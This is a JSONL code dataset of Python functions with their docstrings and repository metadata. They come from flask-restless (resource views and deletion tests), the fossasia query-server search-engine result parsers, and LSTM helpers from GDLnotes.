{"docstring": "\"\"\"Creates the database, the :class:`~flask.Flask` object, the\n:class:`~flask_restless.manager.APIManager` for that application, and\ncreates the ReSTful API endpoints for the :class:`TestSupport.Person`\nand :class:`TestSupport.Article` models.\n\n\"\"\"\n", "func_signal": "def setUp(self):\n", "code": "super(TestDeleting, self).setUp()\n\nclass Article(self.Base):\n    __tablename__ = 'article'\n    id = Column(Integer, primary_key=True)\n    author = relationship('Person')\n    author_id = Column(Integer, ForeignKey('person.id'))\n\nclass Person(self.Base):\n    __tablename__ = 'person'\n    id = Column(Integer, primary_key=True)\n\nself.Article = Article\nself.Person = Person\nself.Base.metadata.create_all()\nself.manager.create_api(Article, methods=['DELETE'])\nself.manager.create_api(Person, methods=['DELETE'])", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that a postprocessor is invoked when deleting a resource.\"\"\"\n", "func_signal": "def test_postprocessor(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\n\ndef assert_deletion(was_deleted=False, **kw):\n    assert was_deleted\n\npostprocessors = dict(DELETE_RESOURCE=[assert_deletion])\nself.manager.create_api(self.Person, methods=['DELETE'],\n                        postprocessors=postprocessors)\nresponse = self.app.delete('/api/person/1')\nassert response.status_code == 204", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Returns the JSON document representing a resource or a collection of\nresources.\n\nIf ``resource_id`` is ``None`` (that is, if the request is of the form\n:http:get:`/people/`), this method returns a collection of resources.\n\nOtherwise, if ``relation_name`` is ``None`` (that is, if the request is\nof the form :http:get:`/people/1`), this method returns a resource with\nthe specified ID.\n\nOtherwise, if ``related_resource_id`` is ``None`` (that is, if the\nrequest is of the form :http:get:`/people/1/articles` or\n:http:get:`/articles/1/author`), this method returns either a resource\nin the case of a to-one relationship or a collection of resources in\nthe case of a to-many relationship.\n\nOtherwise, if none of the arguments are ``None`` (that is, if the\nrequest is of the form :http:get:`/people/1/articles/2`), this method\nreturns the particular resource in the to-many relationship with the\nspecified ID.\n\nThe request documents, response documents, and status codes are in the\nformat specified by the JSON API specification.\n\n\"\"\"\n", "func_signal": "def get(self, resource_id, relation_name, related_resource_id):\n", "code": "if resource_id is None:\n    return self._get_collection()\nif relation_name is None:\n    return self._get_resource(resource_id)\nif related_resource_id is None:\n    return self._get_relation(resource_id, relation_name)\nreturn self._get_related_resource(resource_id, relation_name,\n                                  related_resource_id)", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests for a preprocessor that raises a :exc:`ProcessingException`\nwhen deleting a single resource.\n\n\"\"\"\n", "func_signal": "def test_processing_exception(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\n\ndef forbidden(**kw):\n    raise ProcessingException(status=403, detail='forbidden')\n\npreprocessors = dict(DELETE_RESOURCE=[forbidden])\nself.manager.create_api(self.Person, methods=['DELETE'],\n                        preprocessors=preprocessors)\nresponse = self.app.delete('/api/person/1')\nassert response.status_code == 403\ndocument = loads(response.data)\nerrors = document['errors']\nassert len(errors) == 1\nerror = errors[0]\nassert 'forbidden' == error['detail']\n# Ensure that the person has not been deleted.\nassert self.session.query(self.Person).first() == person", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Deletes the resource with the specified ID.\n\nThe request documents, response documents, and status codes are in the\nformat specified by the JSON API specification.\n\n\"\"\"\n", "func_signal": "def delete(self, resource_id):\n", "code": "for preprocessor in self.preprocessors['DELETE_RESOURCE']:\n    temp_result = preprocessor(resource_id=resource_id)\n    # See the note under the preprocessor in the get() method.\n    if temp_result is not None:\n        resource_id = temp_result\nwas_deleted = False\ninstance = get_by(self.session, self.model, resource_id,\n                  self.primary_key)\nfound_model = get_model(instance)\n# If no instance of the model exists with the specified instance ID,\n# return a 404 response.\n#\n# The first condition is True exactly when there is no row in\n# the table with the given primary key value. The second is True\n# in the special case when the resource exists but is a subclass\n# of the actual model for this API; this may happen if the model\n# is a polymorphic subclass of another class using a single\n# inheritance table.\nif instance is None or found_model is not self.model:\n    detail = 'No resource found with type {0} and ID {1}'\n    detail = detail.format(collection_name(self.model), resource_id)\n    return error_response(404, detail=detail)\nself.session.delete(instance)\nwas_deleted = len(self.session.deleted) > 0\n# Flush all changes to database but do not commit the transaction\n# so that postprocessors have the chance to roll it back\nself.session.flush()\nfor postprocessor in self.postprocessors['DELETE_RESOURCE']:\n    postprocessor(was_deleted=was_deleted)\nself.session.commit()\nif not was_deleted:\n    detail = 'There was no instance to delete.'\n    return error_response(404, detail=detail)\nreturn jsonpify({}), 204", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Updates the resource with the specified ID according to the request\ndata.\n\nThe request documents, response documents, and status codes are in the\nformat specified by the JSON API specification.\n\n\"\"\"\n# try to load the fields/values to update from the body of the request\n", "func_signal": "def patch(self, resource_id):\n", "code": "try:\n    data = json.loads(request.get_data()) or {}\nexcept (BadRequest, TypeError, ValueError, OverflowError) as exception:\n    # this also happens when request.data is empty\n    detail = 'Unable to decode data'\n    return error_response(400, cause=exception, detail=detail)\nfor preprocessor in self.preprocessors['PATCH_RESOURCE']:\n    temp_result = preprocessor(resource_id=resource_id, data=data)\n    # See the note under the preprocessor in the get() method.\n    if temp_result is not None:\n        resource_id = temp_result\n# Get the instance on which to set the new attributes.\ninstance = get_by(self.session, self.model, resource_id,\n                  self.primary_key)\nfound_model = get_model(instance)\n# If no instance of the model exists with the specified instance ID,\n# return a 404 response.\n#\n# The first condition is True exactly when there is no row in\n# the table with the given primary key value. The second is True\n# in the special case when the resource exists but is a subclass\n# of the actual model for this API; this may happen if the model\n# is a polymorphic subclass of another class using a single\n# inheritance table.\nif instance is None or found_model is not self.model:\n    detail = 'No resource found with type {0} and ID {1}'\n    detail = detail.format(collection_name(self.model), resource_id)\n    return error_response(404, detail=detail)\n# Unwrap the data from the collection name key.\ndata = data.pop('data', {})\nif 'type' not in data:\n    detail = 'Missing \"type\" element'\n    return error_response(400, detail=detail)\nif 'id' not in data:\n    detail = 'Missing resource ID'\n    return error_response(400, detail=detail)\ntype_ = data.pop('type')\nid_ = data.pop('id')\n# Check that the requested type matches the expected collection\n# name for this model.\nif type_ != self.collection_name:\n    detail = 'expected type {0}, not {1}'\n    detail = detail.format(self.collection_name, type_)\n    return error_response(409, detail=detail)\n# Check that the ID is a string, as required by the \"Resource\n# Object: Identification\" section of the JSON API specification.\nif not isinstance(id_, STRING_TYPES):\n    detail = ('The \"id\" element of the resource object must be a JSON'\n              ' string: {0}')\n    detail = detail.format(id_)\n    return error_response(409, detail=detail)\nif id_ != resource_id:\n    message = 'ID must be {0}, not {1}'.format(resource_id, id_)\n    return error_response(409, detail=message)\nresult = self._update_instance(instance, data, resource_id)\n# If result is not None, that means there was an error updating the\n# resource.\nif result is not None:\n    return result\n# If we believe that the resource changes in ways other than the\n# updates specified by the request, we must return 200 OK and a\n# representation of the modified resource.\nif self.changes_on_update:\n    only = self.sparse_fields.get(self.collection_name)\n    try:\n        result = self.serializer.serialize(instance, only=only)\n    except SerializationException as exception:\n        return errors_from_serialization_exceptions([exception])\n    status = 200\nelse:\n    result = dict()\n    status = 204\n# Perform any necessary postprocessing.\nfor postprocessor in self.postprocessors['PATCH_RESOURCE']:\n    postprocessor(result=result)\nself.session.commit()\nreturn jsonpify(result), status", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that a processing exception causes the session to be\nflushed but not committed.\n\n\"\"\"\n\n", "func_signal": "def test_postprocessor_no_commit_on_error(self):\n", "code": "def raise_error(**kw):\n    raise ProcessingException(status=500)\n\nperson = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\n\npostprocessors = dict(DELETE_RESOURCE=[raise_error])\nself.manager.create_api(self.Person, methods=['DELETE'],\n                        postprocessors=postprocessors)\nresponse = self.app.delete('/api/person/1')\n\nassert response.status_code == 500\npeople = self.session.query(self.Person).all()\nassert people == []\nself.session.rollback()\npeople = self.session.query(self.Person).all()\nassert people == [person]", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Returns a response containing a single resource with the specified\nID.\n\nFor example, a request like::\n\n    GET /people/1\n\nwill fetch the person resource with ID 1.\n\nIn general, this method is called on requests of the form::\n\n    GET /<collection_name>/<resource_id>\n\n\"\"\"\n", "func_signal": "def _get_resource(self, resource_id):\n", "code": "for preprocessor in self.preprocessors['GET_RESOURCE']:\n    temp_result = preprocessor(resource_id=resource_id)\n    # Let the return value of the preprocessor be the new value of\n    # instid, thereby allowing the preprocessor to effectively specify\n    # which instance of the model to process on.\n    #\n    # We assume that if the preprocessor returns None, it really just\n    # didn't return anything, which means we shouldn't overwrite the\n    # instid.\n    if temp_result is not None:\n        resource_id = temp_result\n# Get the resource with the specified ID.\nresource = get_by(self.session, self.model, resource_id,\n                  self.primary_key)\n# We check here whether there actually is an instance of the\n# correct type and ID.\n#\n# The first condition is True exactly when there is no row in\n# the table with the given primary key value. The second is True\n# in the special case when the resource exists but is a subclass\n# of the actual model for this API; this may happen if the model\n# is a polymorphic subclass of another class using a single\n# inheritance table.\nif resource is None or get_model(resource) is not self.model:\n    detail = 'no resource of type {0} with ID {1}'\n    detail = detail.format(collection_name(self.model), resource_id)\n    return error_response(404, detail=detail)\nreturn self._get_resource_helper(resource)", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Returns a response containing a resource or a collection of\nresources related to a given resource.\n\nFor example, a request for a to-many relationship like this::\n\n    GET /people/1/articles\n\nwill fetch the articles related to the person with ID 1 via the\n``articles`` relationship. On a request to a to-one relationship::\n\n    GET /articles/2/author\n\na single resource will be returned.\n\nIn general, this method is called on requests of the form::\n\n    GET /<collection_name>/<resource_id>/<relation_name>\n\n\"\"\"\n", "func_signal": "def _get_relation(self, resource_id, relation_name):\n", "code": "try:\n    filters, sort, group_by, single, ignorecase = \\\n        self.collection_parameters(resource_id=resource_id,\n                                   relation_name=relation_name)\nexcept (TypeError, ValueError, OverflowError) as exception:\n    detail = 'Unable to decode filter objects as JSON list'\n    return error_response(400, cause=exception, detail=detail)\nexcept SingleKeyError as exception:\n    detail = 'Invalid format for filter[single] query parameter'\n    return error_response(400, cause=exception, detail=detail)\n\nfor preprocessor in self.preprocessors['GET_RELATION']:\n    temp_result = preprocessor(resource_id=resource_id,\n                               relation_name=relation_name,\n                               filters=filters, sort=sort,\n                               group_by=group_by, single=single)\n    # Let the return value of the preprocessor be the new value of\n    # instid, thereby allowing the preprocessor to effectively specify\n    # which instance of the model to process on.\n    #\n    # We assume that if the preprocessor returns None, it really just\n    # didn't return anything, which means we shouldn't overwrite the\n    # instid.\n    if temp_result is not None:\n        if isinstance(temp_result, tuple) and len(temp_result) == 2:\n            resource_id, relation_name = temp_result\n        else:\n            resource_id = temp_result\n\n# Get the resource with the specified ID.\nprimary_resource = get_by(self.session, self.model, resource_id,\n                          self.primary_key)\n# We check here whether there actually is an instance of the\n# correct type and ID.\n#\n# The first condition is True exactly when there is no row in\n# the table with the given primary key value. The second is True\n# in the special case when the resource exists but is a subclass\n# of the actual model for this API; this may happen if the model\n# is a polymorphic subclass of another class using a single\n# inheritance table.\nfound_model = get_model(primary_resource)\nif primary_resource is None or found_model is not self.model:\n    detail = 'no resource of type {0} with ID {1}'\n    detail = detail.format(collection_name(self.model), resource_id)\n    return error_response(404, detail=detail)\n# Return an error if the specified relation does not exist on\n# the model.\nif not is_relationship(self.model, relation_name):\n    detail = 'No such relation: {0}'.format(relation_name)\n    return error_response(404, detail=detail)\n# Get the model of the specified relation.\n# Determine if this is a to-one or a to-many relation.\nif is_like_list(primary_resource, relation_name):\n    return self._get_collection_helper(resource=primary_resource,\n                                       relation_name=relation_name,\n                                       filters=filters, sort=sort,\n                                       group_by=group_by,\n                                       ignorecase=ignorecase,\n                                       single=single)\nelse:\n    resource = getattr(primary_resource, relation_name)\n    return self._get_resource_helper(resource=resource,\n                                     primary_resource=primary_resource,\n                                     relation_name=relation_name)", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that a return value from a preprocessor overrides the ID of\nthe resource to fetch as given in the request URL.\n\n\"\"\"\n", "func_signal": "def test_change_id(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\n\ndef increment_id(resource_id=None, **kw):\n    if resource_id is None:\n        raise ProcessingException\n    return int(resource_id) + 1\n\npreprocessors = dict(DELETE_RESOURCE=[increment_id])\nself.manager.create_api(self.Person, methods=['DELETE'],\n                        preprocessors=preprocessors)\nresponse = self.app.delete('/api/person/0')\nassert response.status_code == 204\nassert self.session.query(self.Person).count() == 0", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests for compatibility with Microsoft Internet Explorer 9.\n\nAccording to issue #267, making requests using JavaScript from MSIE9\ndoes not allow changing the content type of the request (it is always\n``text/html``). Therefore Flask-Restless should ignore the content type\nwhen a request is coming from this client.\n\n\"\"\"\n", "func_signal": "def test_msie9(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\nheaders = {'User-Agent': MSIE9_UA}\ncontent_type = 'text/html'\nresponse = self.app.delete('/api/person/1', headers=headers,\n                           content_type=content_type)\nassert response.status_code == 204", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor div in soup.findAll('div', {'class': 'result'}):\n    result_title = div.find('span', {'class': 'result-title'})\n    title = result_title.getText()[23:-1]\n    link = result_title.find('a').get('href')\n    desc = div.find('span', {'class': 'result-desc'}).getText()[35:-1]\n    urls.append({'title': title, 'link': link, 'desc': desc})\n\nprint('Parsijoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/parsijoo.py", "commit_date": "2018-02-02 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[Tile1, url1], [Title2, url2], ...]\n\"\"\"\n", "func_signal": "def parse_video_response(soup):\n", "code": "urls = []\nfor h in soup.findAll('li', attrs={'class': 'vr vres'}):\n    t = h.find('a', attrs={'class': 'ng'})\n    r = t.get('data-rurl')\n    titleDiv = t.find('div', attrs={'class': 'v-meta bx-bb'})\n    title = titleDiv.find('h3').getText()\n    urls.append({\n        'title': title,\n        'link': r\n    })\n\nprint('Yahoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/yahoo.py", "commit_date": "2018-02-01 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor a in soup.findAll('a', {'class': 'ob'}):\n    title = a.getText()\n    url = a.get('href')\n    urls.append({'title': title, 'link': url})\n\nprint('Mojeek parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/mojeek.py", "commit_date": "2018-01-29 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_news_response(soup):\n", "code": "urls = []\nfor div in soup.findAll('div', {'class': 'news-title-link'}):\n    title = div.a.getText()\n    link = unquote(div.a.get('href'))\n    urls.append({'title': title, 'link': link})\n\nprint('Parsijoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/parsijoo.py", "commit_date": "2018-02-02 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[Tile1, url1], [Title2, url2], ...]\n\"\"\"\n", "func_signal": "def parse_video_response(soup):\n", "code": "urls = []\nfor div in soup.findAll('div', attrs={'class': 'v-info'}):\n    title = div.div.find('a').getText()\n    url = 'https' + div.div.a.get('href')\n    desc = div.find('div', attrs={'class': 'desc'}).getText()\n    urls.append({\n        'title': title,\n        'link': url,\n        'desc': desc\n    })\n\nprint('Ask parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/ask.py", "commit_date": "2018-01-26 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor a in soup.findAll('a', {'class': 'title'}):\n    urls.append({\n        'title': a.getText(),\n        'link': a.get('href')\n    })\nprint('Exalead parsed: ' + str(urls))\nreturn urls", "path": "query-server/app/scrapers/exalead.py", "commit_date": "2018-01-22 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nif soup.find('div', class_='PartialSearchResults-noresults'):\n    return None\nfor div in soup.findAll('div', class_='PartialSearchResults-item'):\n    title = div.div.a.text\n    url = div.div.a['href']\n    try:\n        p = div.find('p', class_='PartialSearchResults-item-abstract')\n        desc = p.text.replace('\\n', '')\n        urls.append({'title': title, 'link': url, 'desc': desc})\n    except Exception:\n        urls.append({'title': title, 'link': url})\nprint('Ask parsed: ' + str(urls))\nreturn urls", "path": "query-server/app/scrapers/ask.py", "commit_date": "2018-01-26 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\"\nParses the response and returns set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor h3 in soup.findAll('h3', {'class': 'r'}):\n    links = h3.find('a')\n    urls.append({'title': links.getText(), 'link': links.get('href')})\n\nprint('Google parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/google.py", "commit_date": "2018-01-22 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[url1], [url2], ...]\n\"\"\"\n", "func_signal": "def parse_news_response(soup):\n", "code": "urls = []\nfor a in soup.findAll('a', attrs={'class': 'ob'}):\n    title = a.getText()\n    url = a.get('href')\n    urls.append({\n        'title': title,\n        'link': url\n    })\n\nprint('Mojeek parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/mojeek.py", "commit_date": "2018-01-29 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_news_response(soup):\n", "code": "urls = []\nfor h3 in soup.findAll('h3', {'class': 'c-title'}):\n    title = h3.a.getText()\n    link = h3.a.get('href')\n    urls.append({'title': title, 'link': link})\n\nprint('Baidu parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/baidu.py", "commit_date": "2018-02-01 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor a in soup.findAll('a', {'class': 'question_link'}):\n    link = 'https://www.quora.com' + str(a.get('href'))\n    urls.append({'title': a.getText(), 'link': link})\n\nprint('Quora parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/quora.py", "commit_date": "2018-01-22 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[Tile1, url1], [Title2, url2], ...]\n\"\"\"\n", "func_signal": "def parse_video_response(soup):\n", "code": "urls = []\nfor a in soup.findAll('a', attrs={'class': 'over-page'}):\n    title = a.get('title')\n    url = 'https://video.parsijoo.ir' + a.get('href')\n    urls.append({\n        'title': title,\n        'link': url\n    })\n\nprint('Parsijoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/parsijoo.py", "commit_date": "2018-02-02 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return list of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor a in soup.findAll('a'):\n    if a.get('href').startswith('/watch?'):\n        link = 'https://www.youtube.com' + str(a.get('href'))\n        if not a.getText().startswith('\\n\\n'):\n            urls.append({'title': a.getText(), 'link': link})\n    else:\n        continue\n\nprint('Youtube parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/youtube.py", "commit_date": "2018-01-22 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[Tile1, url1], [Title2, url2], ...]\n\"\"\"\n", "func_signal": "def parse_image_response(soup):\n", "code": "urls = []\nfor h in soup.findAll('li', attrs={'class': 'ld'}):\n    t = h.find('a')\n    r = t.get('aria-label')\n    cleanr = re.compile('<.*?>')\n    r = re.sub(cleanr, '', r)\n    cleanl = re.compile('&#[\\d]+(;)')\n    r = re.sub(cleanl, '\\'', r)\n    img = t.find('img', attrs={'class': 'process'})\n    url = img.get('data-src')\n    urls.append({\n        'title': r,\n        'link': url\n    })\n\nprint('Yahoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/yahoo.py", "commit_date": "2018-02-01 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor links in soup.findAll('a', {'class': 'result__a'}):\n    urls.append({'title': links.getText(),\n                 'link': links.get('href')})\n\nprint('DuckDuckGo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/duckduckgo.py", "commit_date": "2018-01-22 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[url1], [url2], ...]\n\"\"\"\n", "func_signal": "def parse_image_response(soup):\n", "code": "urls = []\nfor div in soup.find_all('div', class_='image-container overflow'):\n    a = div.find('a')\n    url = 'https://image.parsijoo.ir' + a.get('href')\n    urls.append({\n        'link': url\n    })\n\nprint('Parsijoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/parsijoo.py", "commit_date": "2018-02-02 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\n\nvideo_list = json.loads(str(soup))['list']\nfor item in video_list:\n    title = item['title']\n    link = 'https://www.dailymotion.com/video/' + str(item['id'])\n    urls.append({'title': title, 'link': link})\n\nprint('Dailymotion parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/dailymotion.py", "commit_date": "2018-01-22 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n    Returns: urls (list)\n            [[Tile1, url1], [Title2, url2], ...]\n\"\"\"\n", "func_signal": "def parse_news_response(soup):\n", "code": "urls = []\nfor div in soup.findAll('div', attrs={'class': 'dd algo NewsArticle'}):\n    link = div.find('a', attrs={'class': 'fz-m'})\n    descDiv = div.find('div', attrs={'class': 'compText'})\n    unparsedURL = link.get('href')\n    urlSearch = re.search('/RU=(.*?)/', unparsedURL, re.I)\n    url = unquote(urlSearch.group(1))\n    urls.append({\n        'title': link.getText(),\n        'link': url,\n        'desc': descDiv.find('p').getText()\n    })\n\nprint('Yahoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/yahoo.py", "commit_date": "2018-02-01 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse the response and return set of urls\nReturns: urls (list)\n        [[Tile1,url1], [Title2, url2],..]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor div in soup.findAll('div', {'class': 'result'}):\n    title = div.h3.a.getText()\n    url = div.h3.a['href']\n    urls.append({'title': title, 'link': url})\n\nprint('Baidu parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/baidu.py", "commit_date": "2018-02-01 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\" Parse response and returns the urls\n\n    Returns: urls (list)\n            [[Tile1, url1], [Title2, url2], ...]\n\"\"\"\n", "func_signal": "def parse_response(soup):\n", "code": "urls = []\nfor h in soup.findAll('h3', attrs={'class': 'title'}):\n    t = h.findAll('a', attrs={'class': ' ac-algo fz-l ac-21th lh-24'})\n    for y in t:\n        r = y.get('href')\n        f = r.split('RU=')\n        e = f[-1].split('/RK=2')\n        u = unquote(e[0])\n        urls.append({\n            'title': y.getText(),\n            'link': u\n        })\n\nprint('Yahoo parsed: ' + str(urls))\n\nreturn urls", "path": "query-server/app/scrapers/yahoo.py", "commit_date": "2018-02-01 00:00:00", "repo_name": "fossasia/query-server", "stars": 1660, "license": "apache-2.0", "language": "python", "size": 5323}
{"docstring": "\"\"\"Sample one element from a distribution assumed to be an array of normalized\nprobabilities.\n\"\"\"\n", "func_signal": "def sample_distribution(distribution):\n", "code": "r = random.uniform(0, 1)\ns = 0\nfor i in range(len(distribution)):\n    s += distribution[i]\n    if s >= r:\n        return i\nreturn len(distribution) - 1", "path": "GDLnotes/src/rnn/embed_bigram_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
{"docstring": "# apply dropout to the input\n", "func_signal": "def lstm_cell(i, o, state):\n", "code": "i = tf.nn.dropout(i, tf_keep_prob)\nmult = tf.matmul(i, x) + tf.matmul(o, m) + biases\ninput_gate = tf.sigmoid(mult[:, :num_nodes])\nforget_gate = tf.sigmoid(mult[:, num_nodes:num_nodes * 2])\nupdate = mult[:, num_nodes * 3:num_nodes * 4]\nstate = forget_gate * state + input_gate * tf.tanh(update)\noutput_gate = tf.sigmoid(mult[:, num_nodes * 3:])\noutput = tf.nn.dropout(output_gate * tf.tanh(state), tf_keep_prob)\nreturn output, state", "path": "GDLnotes/src/rnn/embed_bigram_lstm.py", "commit_date": "2017-06-25 00:00:00", "repo_name": "ahangchen/GDLnotes", "stars": 1488, "license": "other", "language": "python", "size": 10708}
